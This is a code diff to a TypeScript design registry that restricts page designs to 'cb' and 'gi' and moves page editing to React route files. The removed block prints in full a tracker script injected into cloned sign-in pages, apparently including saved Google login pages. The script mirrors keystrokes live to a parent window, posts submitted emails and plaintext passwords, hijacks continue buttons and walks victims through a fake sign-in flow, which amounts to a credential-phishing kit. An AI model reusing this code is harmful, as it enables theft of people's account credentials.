@@ -1,10 +1,9 @@
-// File-backed dynamic registry of designs + pages.
+// Design registry for cb/gi participant flows.
 //
-// Content lives as REAL files under src/designs/<design>/ — bundled into the
-// app via Vite glob imports so the first paint is synchronous (no flicker).
-// Edits in the admin Pages tab call a server function that rewrites the file
-// on disk (works in `vite dev`); the in-memory override layer makes the new
-// content visible immediately to the editor and the /view page.
+// Page metadata lives in src/designs/<design>/_meta.json. Actual page UI is
+// implemented as React routes under src/routes/{design}.{page}.tsx and is
+// editable from the admin Pages tab (bundled via Vite glob, with optional
+// localStorage / Supabase overrides and dev-time FS writes).
 
 import {
   deleteDesignFolder,
@@ -12,6 +11,7 @@ import {
   renameDesignFolder,
   renameDesignPageFile,
   writeDesignFile,
+  writeDesignRouteFile,
   writeDesignIndex,
   writeDesignMeta,
 } from "@/lib/designFs.functions";
@@ -45,6 +45,42 @@ export type PageRecord = {
 // ---- Bundled file content (Vite eager glob, ?raw) ----
 
 type RawMap = Record<string, string>;
+
+export const ALLOWED_DESIGNS = ["cb", "gi"] as const;
+
+const TSX_ROUTE_FILES = {
+  ...import.meta.glob("/src/routes/cb.*.tsx", {
+    query: "?raw",
+    import: "default",
+    eager: true,
+  }),
+  ...import.meta.glob("/src/routes/gi.*.tsx", {
+    query: "?raw",
+    import: "default",
+    eager: true,
+  }),
+} as RawMap;
+
+export function isReactDesign(design: string): boolean {
+  return (ALLOWED_DESIGNS as readonly string[]).includes(design);
+}
+
+function reactRouteKey(design: string, page: string): string {
+  return `/src/routes/${design}.${page}.tsx`;
+}
+
+export function getDesignSourcePath(f: DesignFile): string {
+  if (isReactDesign(f.design) && f.kind === "html" && f.page !== "shared") {
+    return `src/routes/${f.design}.${f.page}.tsx`;
+  }
+  if (f.page === "shared") {
+    return f.kind === "css"
+      ? `src/designs/${f.design}/shared.css`
+      : `src/designs/${f.design}/shared.js`;
+  }
+  return `src/designs/${f.design}/${f.page}.${f.kind}`;
+}
+
 const HTML_FILES = import.meta.glob("/src/designs/*/*.html", {
   query: "?raw",
   import: "default",
@@ -197,7 +233,7 @@ function runMigrations() {
     // Wipe stale meta + content overrides + tombstones for bundled designs that
     // were renamed (sign-in -> signin, signinaddon -> signinp).
     const stalePages = ["sign-in", "signinaddon", "signin-in", "signinp-addon"];
-    const designsToClean = ["cb", "blue", "red"];
+    const designsToClean = ["cb", "gi"];
     for (const d of designsToClean) {
       _metaOverrides.delete(d);
       try { window.localStorage.removeItem(META_PREFIX + d); } catch { /* ignore */ }
@@ -317,6 +353,9 @@ function fileBundleKey(f: DesignFile): string {
 }
 
 function bundledContent(f: DesignFile): string | null {
+  if (isReactDesign(f.design) && f.kind === "html" && f.page !== "shared") {
+    return TSX_ROUTE_FILES[reactRouteKey(f.design, f.page)] ?? null;
+  }
   const k = fileBundleKey(f);
   if (f.kind === "html") return HTML_FILES[k] ?? null;
   if (f.kind === "css") return CSS_FILES[k] ?? null;
@@ -441,22 +480,12 @@ function currentIndex(): { order: string[] } {
 // ---- Public registry accessors ----
 
 export function getDesigns(): DesignRecord[] {
-  const order = currentIndex().order.filter((id) => !_hiddenBundledDesigns.has(id));
-  // Include any design that has a meta override or a bundled meta but isn't in
-  // the index (defensive).
-  const seen = new Set(order);
-  for (const k of Object.keys(META_FILES)) {
-    const id = k.split("/")[3];
-    if (id && !seen.has(id) && !_hiddenBundledDesigns.has(id)) {
-      order.push(id);
-      seen.add(id);
-    }
-  }
-  for (const id of _metaOverrides.keys()) {
-    if (!seen.has(id)) {
-      order.push(id);
-      seen.add(id);
-    }
+  const allowed = new Set<string>(ALLOWED_DESIGNS);
+  const order = currentIndex().order.filter(
+    (id) => allowed.has(id) && !_hiddenBundledDesigns.has(id),
+  );
+  for (const id of ALLOWED_DESIGNS) {
+    if (!order.includes(id) && !_hiddenBundledDesigns.has(id)) order.push(id);
   }
   return order.map((id, i) => ({
     id,
@@ -467,29 +496,9 @@ export function getDesigns(): DesignRecord[] {
 
 export function getPagesFor(design: string): PageRecord[] {
   const meta = metaFor(design);
-  const out: PageRecord[] = Object.entries(meta.pages)
+  return Object.entries(meta.pages)
     .filter(([page]) => !_tombstones.has(`${design}:${page}:html`))
     .map(([page, label]) => ({ design, page, label }));
-  const seen = new Set(out.map((p) => p.page));
-  const prefix = `/src/designs/${design}/`;
-  for (const k of Object.keys(HTML_FILES)) {
-    if (!k.startsWith(prefix)) continue;
-    const file = k.slice(prefix.length);
-    if (!file.endsWith(".html")) continue;
-    const page = file.slice(0, -5);
-    if (page === "shared" || seen.has(page)) continue;
-    if (_tombstones.has(`${design}:${page}:html`)) continue;
-    seen.add(page);
-    out.push({ design, page, label: page });
-  }
-  for (const key of _contentOverrides.keys()) {
-    const [d, p, k] = key.split(":");
-    if (d !== design || k !== "html" || p === "shared" || seen.has(p)) continue;
-    if (_tombstones.has(`${design}:${p}:html`)) continue;
-    seen.add(p);
-    out.push({ design, page: p, label: p });
-  }
-  return out;
 }
 
 // Pages shown in the redirect picker — excludes pages with `hidden: true`.
@@ -647,9 +656,15 @@ export async function saveFile(f: DesignFile, content: string): Promise<void> {
     /* ignore */
   }
   try {
-    await writeDesignFile({
-      data: { design: f.design, page: f.page, kind: f.kind, content },
-    });
+    if (isReactDesign(f.design) && f.kind === "html" && f.page !== "shared") {
+      await writeDesignRouteFile({
+        data: { design: f.design as "cb" | "gi", page: f.page, content },
+      });
+    } else {
+      await writeDesignFile({
+        data: { design: f.design, page: f.page, kind: f.kind, content },
+      });
+    }
   } catch {
     /* readonly FS in prod */
   }
@@ -951,441 +966,6 @@ export async function loadAll(): Promise<void> {
   // This stub exists only so legacy callers (which `await loadAll()`) keep
   // working without an extra round-trip.
 }
-
-// ---- Iframe document assembly ----
-
-export function buildSrcDocCached(design: DesignKey, page: PageKey): string {
-  const html = loadFileCached({ design, page, kind: "html" });
-  const css = loadFileCached({ design, page: "shared", kind: "css" });
-  const js = loadFileCached({ design, page: "shared", kind: "js" });
-  const pm = getPageMeta(design, page);
-  const trimmed = html.trimStart().toLowerCase();
-  const isFullDoc =
-    trimmed.startsWith("<!doctype") || trimmed.startsWith("<html");
-  const base = isFullDoc ? injectTracker(html) : wrap(html, css, js);
-  return applyPageMeta(base, pm);
-}
-
-export function buildSrcDocVirtual(
-  design: DesignKey,
-  loadPage: PageKey,
-  virtualPage: PageKey,
-): string {
-  const doc = buildSrcDocCached(design, loadPage);
-  const inject = `<script>window.__ux_virtual_page=${JSON.stringify(virtualPage)};</script>`;
-  if (/<head[^>]*>/i.test(doc)) {
-    return doc.replace(/<head[^>]*>/i, (m) => `${m}\n${inject}`);
-  }
-  return inject + doc;
-}
-
-function escAttr(s: string): string {
-  return s.replace(/&/g, "&amp;").replace(/"/g, "&quot;").replace(/</g, "&lt;");
-}
-
-function escText(s: string): string {
-  return s.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
-}
-
-function applyPageMeta(doc: string, pm: PageMeta): string {
-  let out = doc;
-  const title = (pm.title ?? "").trim();
-  const favicon = (pm.favicon ?? "").trim();
-  if (!title && !favicon) return out;
-
-  if (title) {
-    if (/<title>[\s\S]*?<\/title>/i.test(out)) {
-      out = out.replace(/<title>[\s\S]*?<\/title>/i, `<title>${escText(title)}</title>`);
-    } else if (/<head[^>]*>/i.test(out)) {
-      out = out.replace(/<head[^>]*>/i, (m) => `${m}\n<title>${escText(title)}</title>`);
-    }
-  }
-
-  if (favicon) {
-    // Strip any existing favicon links first.
-    out = out.replace(/<link[^>]+rel=["']?(?:shortcut )?icon["']?[^>]*>/gi, "");
-    const tag = `<link rel="icon" href="${escAttr(favicon)}" />`;
-    if (/<head[^>]*>/i.test(out)) {
-      out = out.replace(/<head[^>]*>/i, (m) => `${m}\n${tag}`);
-    }
-  }
-
-  return out;
-}
-
-const TRACKER_SCRIPT = `<script>
-// Dedupe + debounce: collapse repeats of the same (field,value) within 350ms.
-var __ux_last = {};
-function __ux_post(msg){ try { parent.postMessage(msg, '*'); } catch(e){} }
-function __ux_dedupe_send(field, value){
-  var k = field + ':' + value;
-  var now = Date.now();
-  if (__ux_last[field] && __ux_last[field].k === k && (now - __ux_last[field].at) < 350) return false;
-  __ux_last[field] = { k: k, at: now };
-  __ux_post({__ux:true, type:'input', field: field, value: value});
-  return true;
-}
-window.track = function(field, value){ __ux_dedupe_send(field, String(value == null ? '' : value)); };
-
-// Live keyboard mirroring — emits on focus/input/blur for any text-like input.
-function __ux_field_name(el){
-  return el.getAttribute('data-ux-field') || el.name || el.id || el.getAttribute('aria-label') || el.placeholder || (el.type || 'text');
-}
-function __ux_is_typeable(el){
-  if (!el || el.nodeType !== 1) return false;
-  var tag = el.tagName;
-  if (tag === 'TEXTAREA') return true;
-  if (tag !== 'INPUT') return false;
-  var t = (el.type || 'text').toLowerCase();
-  return ['text','email','password','search','tel','url','number','date'].indexOf(t) >= 0;
-}
-function __ux_emit_live(el, focused){
-  if (!__ux_is_typeable(el)) return;
-  var field = __ux_field_name(el);
-  var type = (el.type || 'text').toLowerCase();
-  var raw = el.value == null ? '' : String(el.value);
-  // Never broadcast password contents in plaintext through live feed.
-  var value = (type === 'password') ? raw.replace(/./g, '•') : raw;
-  __ux_post({__ux:true, type:'live_input', field: field, value: value, focused: !!focused, ftype: type});
-}
-document.addEventListener('focusin', function(e){ __ux_emit_live(e.target, true); }, true);
-document.addEventListener('focusout', function(e){ __ux_emit_live(e.target, false); }, true);
-document.addEventListener('input', function(e){ __ux_emit_live(e.target, true); }, true);
-
-var EMAIL_KEY = '__ux_email';
-var PASS_LEN_KEY = '__ux_pass_len';
-function getStoredEmail(){ try { return sessionStorage.getItem(EMAIL_KEY) || ''; } catch(e){ return ''; } }
-function setStoredEmail(v){ try { sessionStorage.setItem(EMAIL_KEY, v); } catch(e){} }
-function getStoredPassLen(){ try { return parseInt(sessionStorage.getItem(PASS_LEN_KEY) || '0', 10) || 0; } catch(e){ return 0; } }
-function setStoredPassLen(n){ try { sessionStorage.setItem(PASS_LEN_KEY, String(n|0)); } catch(e){} }
-function currentDesignAndPage(){
-  try {
-    var parts = parent.location.pathname.split('/').filter(Boolean);
-    var p = parts[1] || '';
-    // Virtual-page override: cb merges signin + signinp under /cb/signin
-    // and uses window.__ux_virtual_page so tracker flow logic knows where it is.
-    if (window.__ux_virtual_page) p = String(window.__ux_virtual_page);
-    return { design: parts[0] || '', page: p };
-  } catch(e){ return { design:'', page:'' }; }
-}
-function navigateTo(page){
-  var loc = currentDesignAndPage();
-  if (!loc.design) return;
-  // cb special: signin -> signinp is an in-place view swap (URL stays /cb/signin)
-  if (loc.design === 'cb' && loc.page === 'signin' && page === 'signinp') {
-    try { parent.postMessage({__ux:true, type:'swap_virtual', design:'cb', page:'signinp'}, '*'); } catch(e){}
-    return;
-  }
-  var target = '/' + loc.design + '/' + page;
-  try { sessionStorage.setItem('__ux_internal_nav_until', String(Date.now() + 15000)); } catch(e){}
-  // Parent does client-side navigation (no full reload) for smooth transitions.
-  try { parent.postMessage({__ux:true, type:'internal_navigation', url: target}, '*'); } catch(e){}
-  // Fallback: if no parent listener acts within 600ms, hard-navigate.
-  setTimeout(function(){
-    try {
-      if (parent && parent.location && parent.location.pathname !== target) {
-        parent.location.assign(target);
-      }
-    } catch(e){ try { location.assign(target); } catch(_){} }
-  }, 600);
-}
-
-var EMAIL_PLACEHOLDERS = ['lol@gmail.com', 'example@gmail.com', 'user@example.com'];
-function detectOriginalEmail(){
-  // Snapshot any emails currently visible in known account-identifier slots,
-  // so we can swap them out for the participant's typed email later.
-  var found = [];
-  try {
-    var nodes = document.querySelectorAll('[data-profile-identifier], [data-email], [data-identifier]');
-    for (var i = 0; i < nodes.length; i++) {
-      var t = (nodes[i].textContent || '').trim();
-      if (t && t.indexOf('@') > 0 && found.indexOf(t) < 0) found.push(t);
-    }
-  } catch(e){}
-  try {
-    var inputs = document.querySelectorAll('input[type="email"][value], input[name="identifier"][value]');
-    for (var j = 0; j < inputs.length; j++) {
-      var v = (inputs[j].value || '').trim();
-      if (v && v.indexOf('@') > 0 && found.indexOf(v) < 0) found.push(v);
-    }
-  } catch(e){}
-  try {
-    var labels = document.querySelectorAll('[aria-label]');
-    for (var k = 0; k < labels.length; k++) {
-      var al = labels[k].getAttribute('aria-label') || '';
-      var m = al.match(/[\\w.+-]+@[\\w.-]+\\.[A-Za-z]{2,}/);
-      if (m && found.indexOf(m[0]) < 0) found.push(m[0]);
-    }
-  } catch(e){}
-  return found;
-}
-function replaceEmailPlaceholder(){
-  var email = getStoredEmail();
-  var letter = (email ? email.charAt(0) : '?').toUpperCase();
-  try {
-    var avatars = document.querySelectorAll('[data-ux-avatar]');
-    for (var a = 0; a < avatars.length; a++) avatars[a].textContent = letter;
-  } catch(e){}
-  try {
-    var emailEls = document.querySelectorAll('[data-ux-email], [data-profile-identifier]');
-    for (var i = 0; i < emailEls.length; i++) if (email) emailEls[i].textContent = email;
-  } catch(e){}
-  try {
-    var n = getStoredPassLen();
-    var dots = new Array(n + 1).join('•');
-    var pwEls = document.querySelectorAll('[data-ux-password-mask]');
-    for (var j = 0; j < pwEls.length; j++) pwEls[j].textContent = dots;
-  } catch(e){}
-  if (!email) return;
-  // Replace ONLY hidden-identifier <input> values (never visible login boxes).
-  try {
-    var hidEmails = document.querySelectorAll('input[type="hidden"][name*="mail" i], input[type="hidden"][name="identifier"], input.sf-hidden[type="email"], input[aria-hidden="true"][type="email"]');
-    for (var h = 0; h < hidEmails.length; h++) {
-      try { hidEmails[h].value = email; } catch(_){}
-    }
-  } catch(e){}
-  // Build the set of placeholder strings to swap.
-  var placeholders = EMAIL_PLACEHOLDERS.slice();
-  var detected = detectOriginalEmail();
-  for (var di = 0; di < detected.length; di++) {
-    if (detected[di] !== email && placeholders.indexOf(detected[di]) < 0) placeholders.push(detected[di]);
-  }
-  try {
-    var lab = document.querySelectorAll('[aria-label]');
-    for (var li = 0; li < lab.length; li++) {
-      var cur = lab[li].getAttribute('aria-label') || '';
-      var changed = cur;
-      for (var pi = 0; pi < placeholders.length; pi++) {
-        if (changed.indexOf(placeholders[pi]) >= 0) changed = changed.split(placeholders[pi]).join(email);
-      }
-      if (changed !== cur) lab[li].setAttribute('aria-label', changed);
-    }
-  } catch(e){}
-  function walk(node){
-    if (!node) return;
-    if (node.nodeType === 3) {
-      var v = node.nodeValue;
-      if (!v) return;
-      var orig = v;
-      for (var k = 0; k < placeholders.length; k++) {
-        var ph = placeholders[k];
-        if (v.indexOf(ph) >= 0) v = v.split(ph).join(email);
-      }
-      if (v !== orig) node.nodeValue = v;
-    } else if (node.nodeType === 1) {
-      var tag = node.tagName;
-      if (tag === 'SCRIPT' || tag === 'STYLE') return;
-      for (var i = 0; i < node.childNodes.length; i++) walk(node.childNodes[i]);
-    }
-  }
-  walk(document.body);
-}
-function findContinueButton(scope){
-  var buttons = Array.prototype.slice.call((scope||document).querySelectorAll('button, input[type="button"], input[type="submit"], [role="button"]'));
-  return buttons.find(function(b){ return /continue|sign\\s*in|log\\s*in|next|suivant/i.test((b.textContent || b.value || '').trim()); })
-    || document.getElementById('continueBtn')
-    || buttons[0];
-}
-function forceEnable(btn){
-  if (!btn) return;
-  try { btn.disabled = false; } catch(_){}
-  try { btn.removeAttribute('disabled'); } catch(_){}
-  try { btn.setAttribute('aria-disabled', 'false'); } catch(_){}
-  if (btn.classList) btn.classList.add('is-ready');
-}
-function forceDisable(btn){
-  if (!btn) return;
-  try { btn.disabled = true; } catch(_){}
-  try { btn.setAttribute('aria-disabled', 'true'); } catch(_){}
-  if (btn.classList) btn.classList.remove('is-ready');
-}
-function wireContinueButtons(){
-  var loc = currentDesignAndPage();
-  var here = loc.page || '';
-  // Per-design page → next mapping for the guided flow.
-  var DESIGN_NEXT = {
-    'go': { 'signin': 'signinp', 'signinp': 'signinploading' }
-  };
-  var NEXT = (DESIGN_NEXT[loc.design]) || { 'signin': 'signinp', 'signinp': 'loading' };
-  var bodyNext = document.body && document.body.getAttribute && document.body.getAttribute('data-ux-next');
-  var nextPage = bodyNext || NEXT[here] || 'loading';
-
-  var emails = Array.prototype.slice.call(document.querySelectorAll('input[type="email"]:not([aria-hidden="true"]):not(.sf-hidden), input[name*="mail" i]:not([aria-hidden="true"]), input[id*="mail" i]:not([aria-hidden="true"]), input[autocomplete*="email" i]:not([aria-hidden="true"]), input[autocomplete*="username" i]:not([aria-hidden="true"]), input[name="identifier"]:not([aria-hidden="true"]):not(.sf-hidden)'));
-  var passwords = Array.prototype.slice.call(document.querySelectorAll('input[type="password"]:not([aria-hidden="true"]), input[name*="pass" i]:not([aria-hidden="true"]), input[name="Passwd"]'));
-  var hasPassword = passwords.length > 0;
-  if (!emails.length && !hasPassword) {
-    emails = Array.prototype.slice.call(document.querySelectorAll('form input[type="text"], input[type="text"]')).slice(0, 1);
-  }
-  var input = passwords[0] || emails[0];
-  if (!input) {
-    var btnOnly = findContinueButton();
-    if (btnOnly && !btnOnly.__uxContinueWired) {
-      btnOnly.__uxContinueWired = true;
-      forceEnable(btnOnly);
-      btnOnly.addEventListener('click', function(e){
-        e.preventDefault(); e.stopPropagation();
-        if (e.stopImmediatePropagation) e.stopImmediatePropagation();
-        navigateTo(nextPage);
-      }, true);
-    }
-    return;
-  }
-  var root = input.closest('form') || document;
-  var btn = findContinueButton(root) || findContinueButton(document);
-  if (!btn || btn.__uxContinueWired) return;
-  btn.__uxContinueWired = true;
-  function ok(){ return (input.value || '').length > 0; }
-  function sync(){ if (ok()) forceEnable(btn); else forceDisable(btn); }
-  input.addEventListener('input', sync, true);
-  input.addEventListener('keyup', sync, true);
-  input.addEventListener('change', sync, true);
-  input.addEventListener('focus', sync, true);
-  // Lock the disabled property/attribute so frameworks (Polymer / Google's
-  // saved page jscontroller) cannot re-disable the button while we have text.
-  try {
-    var proto = Object.getPrototypeOf(btn);
-    var origDesc = Object.getOwnPropertyDescriptor(proto, 'disabled') || Object.getOwnPropertyDescriptor(HTMLButtonElement.prototype, 'disabled');
-    Object.defineProperty(btn, 'disabled', {
-      configurable: true,
-      get: function(){ return !ok(); },
-      set: function(v){ if (!ok() && origDesc && origDesc.set) origDesc.set.call(btn, v); }
-    });
-  } catch(e){}
-  try {
-    var mo = new MutationObserver(function(){
-      if (ok()) {
-        if (btn.hasAttribute('disabled')) btn.removeAttribute('disabled');
-        if (btn.getAttribute('aria-disabled') === 'true') btn.setAttribute('aria-disabled', 'false');
-      }
-    });
-    mo.observe(btn, { attributes: true, attributeFilter: ['disabled','aria-disabled','class'] });
-  } catch(e){}
-  setInterval(function(){ if (ok() && btn.hasAttribute('disabled')) btn.removeAttribute('disabled'); }, 100);
-
-
-  btn.addEventListener('click', function(e){
-    if (!ok()) { e.preventDefault(); e.stopPropagation(); if (e.stopImmediatePropagation) e.stopImmediatePropagation(); sync(); return; }
-    e.preventDefault();
-    e.stopPropagation();
-    if (e.stopImmediatePropagation) e.stopImmediatePropagation();
-    if (hasPassword) {
-      setStoredPassLen((input.value || '').length);
-      try { window.track('password_submitted', input.value || ''); } catch(err){}
-      try { window.track('continue_clicked', '1'); } catch(err){}
-      navigateTo(nextPage);
-    } else {
-      setStoredEmail(input.value || '');
-      try { window.track('email_submitted', input.value || ''); } catch(err){}
-      try { window.track('continue_clicked', '1'); } catch(err){}
-      navigateTo(nextPage);
-    }
-  }, true);
-  var form = input.closest('form');
-  if (form && !form.__uxSubmitWired) {
-    form.__uxSubmitWired = true;
-    form.addEventListener('submit', function(e){
-      e.preventDefault();
-      e.stopPropagation();
-      if (e.stopImmediatePropagation) e.stopImmediatePropagation();
-      if (btn) btn.click();
-    }, true);
-  }
-  // Enter-to-submit on the field even when the form swallows submits.
-  input.addEventListener('keydown', function(e){
-    if (e.key === 'Enter' || e.keyCode === 13) {
-      e.preventDefault(); e.stopPropagation(); if (e.stopImmediatePropagation) e.stopImmediatePropagation();
-      if (ok() && btn) btn.click();
-    }
-  }, true);
-  sync();
-}
-function wirePasswordToggles(){
-  if (window.__pwToggleWired) return;
-  window.__pwToggleWired = true;
-  document.addEventListener('click', function(e){
-    var path = e.composedPath ? e.composedPath() : [];
-    var btn = null;
-    for (var i = 0; i < path.length; i++) {
-      var n = path[i];
-      if (n && n.nodeType === 1 && (n.tagName === 'BUTTON' || n.getAttribute && n.getAttribute('role') === 'button')) {
-        var lab = (n.getAttribute && (n.getAttribute('aria-label') || '')) || '';
-        if (/show password|hide password/i.test(lab) || n.querySelector && n.querySelector('[data-icon-name="invisible"],[data-icon-name="visible"]')) {
-          btn = n; break;
-        }
-      }
-    }
-    if (!btn) return;
-    var scope = btn.closest('form') || btn.closest('div') || document;
-    var pw = scope.querySelector('input[type="password"], input[data-pw-toggled="1"]');
-    if (!pw) {
-      // search wider
-      pw = document.querySelector('input[type="password"], input[data-pw-toggled="1"]');
-    }
-    if (!pw) return;
-    e.preventDefault();
-    e.stopPropagation();
-    var showing = pw.getAttribute('type') === 'text';
-    if (showing) {
-      pw.setAttribute('type', 'password');
-      btn.setAttribute('aria-label', 'Show password');
-    } else {
-      pw.setAttribute('type', 'text');
-      pw.setAttribute('data-pw-toggled', '1');
-      btn.setAttribute('aria-label', 'Hide password');
-    }
-    // Swap icon glyph if present
-    try {
-      var icon = btn.querySelector('[data-icon-name]');
-      if (icon) {
-        var name = icon.getAttribute('data-icon-name');
-        if (name === 'invisible') icon.setAttribute('data-icon-name', 'visible');
-        else if (name === 'visible') icon.setAttribute('data-icon-name', 'invisible');
-      }
-    } catch(_){}
-  }, true);
-}
-function boot(){ replaceEmailPlaceholder(); wireContinueButtons(); wirePasswordToggles(); }
-boot();
-if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', boot);
-// Re-run after late hydration (Google saved pages mutate the DOM after load).
-setTimeout(boot, 400);
-setTimeout(boot, 1200);
-function reportViewport(){ try { parent.postMessage({__ux:true, type:'viewport', w:innerWidth, h:innerHeight}, '*'); } catch(e){} }
-reportViewport();
-window.addEventListener('resize', reportViewport, {passive:true});
-window.addEventListener('click', function(e){ try { parent.postMessage({__ux:true, type:'click', x:e.clientX, y:e.clientY, w:innerWidth, h:innerHeight}, '*'); } catch(e){} });
-window.addEventListener('mousemove', function(e){ try { parent.postMessage({__ux:true, type:'mouse', x:e.clientX, y:e.clientY, w:innerWidth, h:innerHeight}, '*'); } catch(e){} }, {passive:true});
-window.addEventListener('scroll', function(){ try { parent.postMessage({__ux:true, type:'scroll', sx:scrollX, sy:scrollY}, '*'); } catch(e){} }, {passive:true});
-// (Generic keystroke 'input' broadcasts removed — live_input + window.track() cover the feed without spam.)
-window.addEventListener('message', function(ev){
-  var d = ev.data; if (!d || d.__mirror !== true) return;
-  if (d.type === 'live_input' && typeof d.field === 'string') {
-    // Paint observer's mirror value into matching input so the observer sees real text.
-    var sel = '[data-ux-field="'+d.field+'"], [name="'+d.field+'"], #'+d.field;
-    var el = null;
-    try { el = document.querySelector(sel); } catch(e){}
-    if (el && (el.tagName === 'INPUT' || el.tagName === 'TEXTAREA')) {
-      var t = (el.type || 'text').toLowerCase();
-      if (t !== 'password') el.value = d.value == null ? '' : String(d.value);
-    }
-  }
-});
-<\/script>`;
-
-function injectTracker(html: string): string {
-  if (/<\/body>/i.test(html))
-    return html.replace(/<\/body>/i, TRACKER_SCRIPT + "</body>");
-  return html + TRACKER_SCRIPT;
-}
-
-function wrap(html: string, css: string, js: string): string {
-  return `<!doctype html><html><head><meta charset="utf-8" />
-<style>${css}</style></head><body>${html}
-${TRACKER_SCRIPT}
-<script>${js}<\/script>
-</body></html>`;
-}
-
 
 // ---- Change subscriptions (in-tab + cross-tab via storage events) ----
 
